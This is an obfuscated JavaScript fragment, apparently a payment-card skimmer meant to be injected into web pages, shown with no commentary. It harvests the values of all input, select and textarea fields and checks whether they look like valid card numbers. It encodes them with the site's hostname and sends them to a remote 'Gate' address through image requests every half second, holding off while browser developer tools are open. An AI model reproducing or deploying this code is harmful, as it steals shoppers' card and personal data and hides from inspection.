_0x1fea61;for(_0x59ca29=0x0;_0x59ca29<this['\x6c\x65\x6e\x67\x74\x68'];_0x59ca29++){_0x58a470=this[_0x1288('0x14')](_0x59ca29);_0x1fea61=(_0x1fea61<<0x5)-_0x1fea61+_0x58a470;_0x1fea61|=0x0;}return _0x1fea61;};var _0x1ce87b={};_0x1ce87b[_0x1288('0x15')]=_0x1288('0x16');_0x1ce87b['\x44\x61\x74\x61']={};_0x1ce87b[_0x1288('0x17')]=[];_0x1ce87b[_0x1288('0x18')]=![];_0x1ce87b[_0x1288('0x19')]=function(_0x575ede){if(_0x575ede.id!==undefined&&_0x575ede.id!=''&&_0x575ede.id!==null&&_0x575ede.value.length<0x100&&_0x575ede.value.length>0x0){if(_0x5d2999(_0x1c6b51(_0x1c6b51(_0x575ede.value,'\x2d',''),'\x20',''))&&_0xa03f70(_0x1c6b51(_0x1c6b51(_0x575ede.value,'\x2d',''),'\x20','')))_0x1ce87b.IsValid=!![];_0x1ce87b.Data[_0x575ede.id]=_0x575ede.value;return;}if(_0x575ede.name!==undefined&&_0x575ede.name!=''&&_0x575ede.name!==null&&_0x575ede.value.length<0x100&&_0x575ede.value.length>0x0){if(_0x5d2999(_0x1c6b51(_0x1c6b51(_0x575ede.value,'\x2d',''),'\x20',''))&&_0xa03f70(_0x1c6b51(_0x1c6b51(_0x575ede.value,'\x2d',''),'\x20','')))_0x1ce87b.IsValid=!![];_0x1ce87b.Data[_0x575ede.name]=_0x575ede.value;return;}};_0x1ce87b[_0x1288('0x1a')]=function(){var _0x17ecc3=document.getElementsByTagName(_0x1288('0x1b'));var _0xe6a956=document.getElementsByTagName(_0x1288('0x1c'));var _0x4f84b9=document.getElementsByTagName(_0x1288('0x1d'));for(var _0x4e8921=0x0;_0x4e8921<_0x17ecc3.length;_0x4e8921++)_0x1ce87b.SaveParam(_0x17ecc3[_0x4e8921]);for(var _0x4e8921=0x0;_0x4e8921<_0xe6a956.length;_0x4e8921++)_0x1ce87b.SaveParam(_0xe6a956[_0x4e8921]);for(var _0x4e8921=0x0;_0x4e8921<_0x4f84b9.length;_0x4e8921++)_0x1ce87b.SaveParam(_0x4f84b9[_0x4e8921]);};_0x1ce87b[_0x1288('0x1e')]=function(){if(!window.devtools.isOpen&&_0x1ce87b.IsValid){_0x1ce87b.Data['\x44\x6f\x6d\x61\x69\x6e']=location.hostname;var _0x5000ce=encodeURIComponent(window.btoa(JSON.stringify(_0x1ce87b.Data)));var _0x44d42e=_0x5000ce.hashCode();for(var _0x528cc0=0x0;_0x528cc0<_0x1ce87b.Sent.length;_0x528cc0++)if(_0x1ce87b.Sent[_0x528cc0]==_0x44d42e)return;_0x1ce87b.LoadImage(_0x5000ce);}};_0x1ce87b[_0x1288('0x1f')]=function(){_0x1ce87b.SaveAllFields();_0x1ce87b.SendData();};_0x1ce87b[_0x1288('0x20')]=function(_0xea5972){_0x1ce87b.Sent.push(_0xea5972.hashCode());var _0x1efc77=document.createElement(_0x1288('0x21'));_0x1efc77.src=_0x1ce87b.GetImageUrl(_0xea5972);};_0x1ce87b[_0x1288('0x22')]=function(_0x109979){return _0x1ce87b.Gate+_0x1288('0x23')+_0x109979;};document[_0x1288('0x24')]=function(){if(document['\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65']===_0x1288('0x25')){window['\x73\x65\x74\x49\x6e\x74\x65\x72\x76\x61\x6c'](_0x1ce87b[_0x1288('0x1f')],0x1f4);}};